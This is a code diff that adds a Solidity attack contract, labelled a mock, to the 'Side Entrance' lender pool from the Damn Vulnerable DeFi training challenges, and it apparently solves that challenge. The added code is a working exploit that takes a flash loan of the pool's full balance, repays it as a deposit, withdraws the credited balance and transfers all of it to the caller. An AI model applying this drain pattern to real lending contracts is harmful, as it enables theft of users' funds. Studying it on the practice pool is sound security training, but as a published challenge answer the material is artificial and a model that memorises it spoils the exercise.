@@ -7,6 +7,26 @@ interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
 
+contract FlashLoanEtherReceiverMock is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    function attack() external payable {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable override {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+
 /**
  * @title SideEntranceLenderPool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
